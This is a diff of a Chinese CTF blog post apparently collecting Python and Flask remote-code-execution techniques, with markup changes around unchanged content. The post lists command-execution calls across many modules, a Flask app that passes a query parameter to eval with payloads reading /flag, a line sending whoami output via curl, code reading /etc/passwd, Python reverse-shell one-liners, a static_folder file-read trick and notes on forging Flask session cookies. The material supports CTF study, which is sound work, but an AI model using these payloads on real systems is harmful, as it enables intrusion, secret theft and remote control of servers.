-<h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
-<h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p>
-<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p>
+<h2 id="python-的命令执行"><a class="markdownIt-Anchor" href="#python-的命令执行"></a> Python 的命令执行</h2>
+<p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
+<h3 id="os模块"><a class="markdownIt-Anchor" href="#os模块"></a> OS模块</h3>
+<p>经典款:</p>
+<h4 id="ossystem"><a class="markdownIt-Anchor" href="#ossystem"></a> <code>os.system</code>:</h4>
+<p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p>
 <pre><code class="highlight python"><span class="keyword">import</span> os
 os.system(<span class="string">&#x27;dir&#x27;</span>)  //输出目录结构
 <span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //输出目录结构,下一行输出<span class="number">0</span></code></pre>
-
-<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen:"></a><code>os.popen</code>:</h4><p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p>
+<h4 id="ospopen"><a class="markdownIt-Anchor" href="#ospopen"></a> <code>os.popen</code>:</h4>
+<p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p>
 <pre><code class="highlight python"><span class="keyword">import</span> os
 out=os.popen(<span class="string">&#x27;dir&#x27;</span>)
 <span class="built_in">print</span>(out.read())</code></pre>
-
-<h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>可以认为subprocess是os模块的安全版</p>
-<h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>基本是subprocess中最常用的模块,包含下列参数</p>
+<h3 id="subprocess模块"><a class="markdownIt-Anchor" href="#subprocess模块"></a> subprocess模块</h3>
+<p>可以认为subprocess是os模块的安全版</p>
+<h4 id="subprocessrun"><a class="markdownIt-Anchor" href="#subprocessrun"></a> <code>subprocess.run</code>:</h4>
+<p>基本是subprocess中最常用的模块,包含下列参数</p>
 <pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre>
-
 <hr>
 <pre><code class="highlight plaintext">1.唯一一个必须要有的参数,为一个字符串列表/字符串,其中第一个值是一个应用程序,后面的则是传递的参数</code></pre>
-
 <pre><code class="highlight python"><span class="keyword">import</span> subprocess
 out=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
 <span class="built_in">print</span>(out.stdout)</code></pre>
-
 <p>这也是我们常说的弹计算器命令,但是需要注意,由于windows并不是像linux那样由纯文件组成,所以这里的列表中无法直接使用dir命令如<code>[&quot;dir&quot;]</code>(本质上这个dir是传递给windows.cmd的一个参数,但是这个windows.cmd程序的位置找不到)</p>
 <hr>
 <pre><code class="highlight plaintext">2.shell=True,默认为false</code></pre>
-
 <p>用于控制是否允许在第一个参数处直接使用shell命令的,开启后则可以不使列表而是以字符串形式直接使用,如:</p>
 <pre><code class="highlight python"><span class="keyword">import</span> subprocess
 out=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
 <span class="built_in">print</span>(out.stdout)</code></pre>
-
 <p>复现效果：</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p>
 <hr>
 <pre><code class="highlight plaintext">3.stdin,stdout,stderr,默认为false</code></pre>
-
 <p>这三个参数用来设置输入,输出和错误信息为管道对象或是类文件对象,这里不常用.</p>
 <hr>
 <pre><code class="highlight plaintext">4.capture_output=true,默认为false</code></pre>
-
 <p>用于捕获stdout和stderr时期不会输出到终端而是作为一个对象来返回.</p>
 <hr>
 <pre><code class="highlight plaintext">5.text=true,默认为false</code></pre>
-
 <p>默认状态下返回的数据为字节流,而<code>text=true</code>可以使得返回的数据为字符串而不是字节流,不用人手动转换.</p>
 <hr>
 <pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre>
-
 <p>如果指定了参数,则stdin,stdout,stderr可以接受该类型的数据,否则默认为字节流.可以认为是<code>text=true</code>的一个手动选择版</p>
 <hr>
 <pre><code class="highlight plaintext">7.timeout</code></pre>
-
 <p>设置命令超时时间.如果命令执行时间超时,子进程将被杀死,并弹出 <code>TimeoutExpired</code>异常.</p>
 <hr>
 <pre><code class="highlight plaintext">8.check=true</code></pre>
-
 <p>如果该参数设置为<code>True</code>,并且进程退出状态码不是0,则弹出<code>CalledProcessError</code>异常.</p>
-<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>是subprocess方法的核心,可用于实现更为复杂的功能</p>
+<h4 id="subprocesspopen"><a class="markdownIt-Anchor" href="#subprocesspopen"></a> <code>subprocess.Popen</code></h4>
+<p>是subprocess方法的核心,可用于实现更为复杂的功能</p>
 <p>具体介绍就不给了，给两个大佬的博客自己选择着看看把(</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10934322.html">Python之subprocess模块 - 卿先生 - 博客园</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yifengyu/p/16115712.html">python中的subprocess.Popen()、PIPE使用详解 - 平行时空的旅者 - 博客园</a></p>
 <p>直接开始本地复现</p>
 <pre><code class="highlight plaintext">import  subprocess
 p = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre>
-
 <p>在linux成功复现</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p>
 <p>反观windows(</p>
@@ -240,29 +369,28 @@ p = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span cl
 stdout, stderr = p.communicate()
 
 <span class="built_in">print</span>(stdout)</code></pre>
-
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p>
 <p>一般poc长这个样子</p>
 <pre><code class="highlight python"><span class="keyword">import</span> subprocess
 a=subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()
 <span class="built_in">print</span>(a)</code></pre>
-
-
-
-<h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
+<h4 id="subprocessgetoutput"><a class="markdownIt-Anchor" href="#subprocessgetoutput"></a> <code>subprocess.getoutput</code></h4>
+<p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
 <p>用于执行系统命令,并将stdout和stderr直接捕获(不输出到终端)并以字符串形式返回</p>
 <pre><code class="highlight python"><span class="keyword">import</span> os
 <span class="keyword">import</span> subprocess
 out=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># 到这还没有输出</span>
 <span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
-
-<h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p>
+<h4 id="subprocesscheck_output"><a class="markdownIt-Anchor" href="#subprocesscheck_output"></a> <code>subprocess.check_output</code></h4>
+<p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p>
 <pre><code class="highlight python"><span class="keyword">import</span> subprocess
 out=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># 到这还没有输出</span>
 <span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
-
-<h4 id="subprocess-call-及check-call"><a href="#subprocess-call-及check-call" class="headerlink" title="subprocess.call() 及check_call()"></a><code>subprocess.call() </code>及<code>check_call()</code></h4><p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br><code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p>
-<h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p>
+<h4 id="subprocesscall-及check_call"><a class="markdownIt-Anchor" href="#subprocesscall-及check_call"></a> <code>subprocess.call() </code>及<code>check_call()</code></h4>
+<p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br>
+<code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p>
+<h3 id="send_file"><a class="markdownIt-Anchor" href="#send_file"></a> send_file</h3>
+<p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p>
 <pre><code class="highlight python"><span class="keyword">import</span> os
 <span class="keyword">import</span> subprocess
 <span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Response
@@ -272,8 +400,8 @@ app = Flask(__name__)
     <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)
 <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
     app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
-
-<h3 id="eval和exec"><a href="#eval和exec" class="headerlink" title="eval和exec"></a>eval和exec</h3><p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p>
+<h3 id="eval和exec"><a class="markdownIt-Anchor" href="#eval和exec"></a> eval和exec</h3>
+<p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p>
 <pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
 app = Flask(__name__)
 <span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
@@ -286,7 +414,6 @@ app = Flask(__name__)
         <span class="keyword">return</span> res
 <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
     app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
-
 <p>payload:</p>
 <pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()
 ?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,
@@ -295,17 +422,17 @@ capture_output=<span class="literal">True</span>, encoding=<span class="string">
 shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)
 ?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)
 ?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre>
-
 <p>这里面的<code>__import__(&quot;os&quot;)</code>一类的用法是用于动态导入模块的.</p>
-<h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3><pre><code class="highlight plaintext">import commands
+<h3 id="commands"><a class="markdownIt-Anchor" href="#commands"></a> commands</h3>
+<pre><code class="highlight plaintext">import commands
 commands.getstatusoutput(&quot;ls&quot;)
 commands.getoutput(&quot;ls&quot;)
 commands.getstatus(&quot;ls&quot;)</code></pre>
-
-<h3 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h3><pre><code class="highlight plaintext">import ctypes
+<h3 id="ctypes"><a class="markdownIt-Anchor" href="#ctypes"></a> ctypes</h3>
+<pre><code class="highlight plaintext">import ctypes
 ctypes.CDLL(None).system(&#x27;ls /&#x27;.encode())</code></pre>
-
-<h3 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h3><pre><code class="highlight plaintext">import threading
+<h3 id="threading"><a class="markdownIt-Anchor" href="#threading"></a> threading</h3>
+<pre><code class="highlight plaintext">import threading
 import os
 
 def func():
@@ -315,38 +442,38 @@ t = threading.Thread(target=func)  # 创建一个新的线程
 t.start()  # 开始执行新的线程
 
 __import__(&#x27;threading&#x27;).Thread(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)).start()</code></pre>
-
-<h4 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h4><pre><code class="highlight plaintext">import multiprocessing
+<h4 id="multiprocessing"><a class="markdownIt-Anchor" href="#multiprocessing"></a> multiprocessing</h4>
+<pre><code class="highlight plaintext">import multiprocessing
 multiprocessing.Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>
-
-<h4 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a><code>_posixsubprocess</code></h4><pre><code class="highlight plaintext">import os
+<h4 id="_posixsubprocess"><a class="markdownIt-Anchor" href="#_posixsubprocess"></a> <code>_posixsubprocess</code></h4>
+<pre><code class="highlight plaintext">import os
 import _posixsubprocess
 
 _posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
 
 __loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)</code></pre>
-
-<h4 id="pty"><a href="#pty" class="headerlink" title="pty"></a>pty</h4><pre><code class="highlight plaintext">import pty
+<h4 id="pty"><a class="markdownIt-Anchor" href="#pty"></a> pty</h4>
+<pre><code class="highlight plaintext">import pty
 pty.spawn(&quot;ls&quot;)</code></pre>
-
-<h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h4><pre><code class="highlight plaintext">import timeit
+<h4 id="timeit"><a class="markdownIt-Anchor" href="#timeit"></a> timeit</h4>
+<pre><code class="highlight plaintext">import timeit
 timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)</code></pre>
-
-<h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><pre><code class="highlight plaintext">import platform
+<h4 id="platform"><a class="markdownIt-Anchor" href="#platform"></a> platform</h4>
+<pre><code class="highlight plaintext">import platform
 print platform.popen(&#x27;dir&#x27;).read()</code></pre>
-
-<h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h4><pre><code class="highlight plaintext">import importlib
+<h4 id="importlib"><a class="markdownIt-Anchor" href="#importlib"></a> importlib</h4>
+<pre><code class="highlight plaintext">import importlib
 importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)
 # Python3可以，Python2没有该函数
 importlib.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</code></pre>
-
-<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><pre><code class="highlight plaintext">import sys
+<h4 id="sys"><a class="markdownIt-Anchor" href="#sys"></a> sys</h4>
+<pre><code class="highlight plaintext">import sys
 sys.modules[&#x27;os&#x27;].system(&#x27;calc&#x27;)</code></pre>
-
-<h4 id="linecache"><a href="#linecache" class="headerlink" title="linecache"></a>linecache</h4><pre><code class="highlight plaintext">import linecache
+<h4 id="linecache"><a class="markdownIt-Anchor" href="#linecache"></a> linecache</h4>
+<pre><code class="highlight plaintext">import linecache
 linecache.os.system(&#x27;ls&#x27;)</code></pre>
-
-<h4 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h4><pre><code class="highlight plaintext">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;)
+<h4 id="builtins"><a class="markdownIt-Anchor" href="#builtins"></a> builtins</h4>
+<pre><code class="highlight plaintext">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;)
 
 eval(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;)
 
@@ -356,17 +483,17 @@ execfile(&quot;E:\Python27\Lib\os.py&quot;)
 system(&#x27;calc&#x27;)
 
 exec(compile(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;))</code></pre>
-
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code class="highlight plaintext">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)
+<h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h4>
+<pre><code class="highlight plaintext">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)
 
 s=__import__(&#x27;socket&#x27;).socket(__import__(&#x27;socket&#x27;).AF_INET,__import__(&#x27;socket&#x27;).SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));[__import__(&#x27;os&#x27;).dup2(s.fileno(),i) for i in range(3)];__import__(&#x27;pty&#x27;).spawn(&quot;/bin/sh&quot;)</code></pre>
-
 <p>其他</p>
 <pre><code class="highlight plaintext">bdb：bdb.os、cgi.sys
 cgi：cgi.os、cgi.sys</code></pre>
-
-<h2 id="Flask-RCE利用-内存马篇"><a href="#Flask-RCE利用-内存马篇" class="headerlink" title="Flask RCE利用(内存马篇)"></a>Flask RCE利用(内存马篇)</h2><p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p>
-<h3 id="static-folder-任意文件读取"><a href="#static-folder-任意文件读取" class="headerlink" title="static_folder 任意文件读取"></a>static_folder 任意文件读取</h3><p>flask在初始化的时候 会设置很多内部的属性</p>
+<h2 id="flask-rce利用内存马篇"><a class="markdownIt-Anchor" href="#flask-rce利用内存马篇"></a> Flask RCE利用(内存马篇)</h2>
+<p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p>
+<h3 id="static_folder-任意文件读取"><a class="markdownIt-Anchor" href="#static_folder-任意文件读取"></a> static_folder 任意文件读取</h3>
+<p>flask在初始化的时候 会设置很多内部的属性</p>
 <pre><code class="highlight plaintext">python
 def __init__(
         self,
@@ -388,95 +515,149 @@ self.teardown_appcontext_funcs 和 self.shell_context_processors 用来管理应
 self.blueprints 用来组织应用的模块化功能，self.url_map 管理路由规则。
 self.url_map 储存了应用的路由信息
 self.add_url_rule用来添加 URL 规则</code></pre>
-
 <p>注意到是这个</p>
 <pre><code class="highlight plaintext">plaintext
 static_url_path: str | None = None 指定静态文件的 URL 路径（即浏览器中访问静态文件的路径）
 static_folder 指定静态文件所在的文件夹路径</code></pre>
-
 <p>如果我们修改了相关的值 就可能会造成任意文件读取</p>
-<p>不过在参数传递的时候 不可以使用&#x3D;给这些东西赋值 需要使用setattr这个给他们赋值</p>
+<p>不过在参数传递的时候 不可以使用=给这些东西赋值 需要使用setattr这个给他们赋值</p>
 <pre><code class="highlight plaintext">plaintext
 setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
-
-<h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><h2 id="Flask-RCE利用-debug篇"><a href="#Flask-RCE利用-debug篇" class="headerlink" title="Flask RCE利用(debug篇)"></a>Flask RCE利用(debug篇)</h2><h2 id="一些辅助工作"><a href="#一些辅助工作" class="headerlink" title="一些辅助工作"></a>一些辅助工作</h2><p>一般会在一开始套个session 的验证</p>
+<h3 id="路由注入"><a class="markdownIt-Anchor" href="#路由注入"></a> 路由注入</h3>
+<h2 id="flask-rce利用debug篇"><a class="markdownIt-Anchor" href="#flask-rce利用debug篇"></a> Flask RCE利用(debug篇)</h2>
+<h2 id="一些辅助工作"><a class="markdownIt-Anchor" href="#一些辅助工作"></a> 一些辅助工作</h2>
+<p>一般会在一开始套个session 的验证</p>
 <p>这里就要用到session伪造的芝士了，首先了解一下session罢</p>
-<p>1）flask session 分析<br>flask对session的处理位于flask&#x2F;sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
+<p>1）flask session 分析<br>
+flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
 <pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
 1</code></pre>
-
 <ul>
 <li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li>
 </ul>
 <pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息
 1</code></pre>
-
 <ul>
 <li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li>
 <li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li>
 </ul>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13858">参考文章</a>: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>	“flask框架漏洞”<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13858">参考文章</a>: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>	“python rce”</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-CTF/">-Web -CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/21/RCE/" title="RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-21</div><div class="info-item-2">RCE</div></div><div class="info-2"><div class="info-item-1">RCE（远程代码执行漏洞）原理及漏洞相关RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统 系统命令执行函数 *** system() 语法为system(string $command, int &amp;$return var = ?) *** passthru() system()的平替，写个命令就会执行命令，自己能回显 *** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显 *** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果 *** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容 *** proc_open()...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E7%9A%84rce%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5-%E6%9C%AA%E8%A1%A5%E5%AE%8C"><span class="toc-text">python的rce姿势以及内存马注入(未补完)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">Python 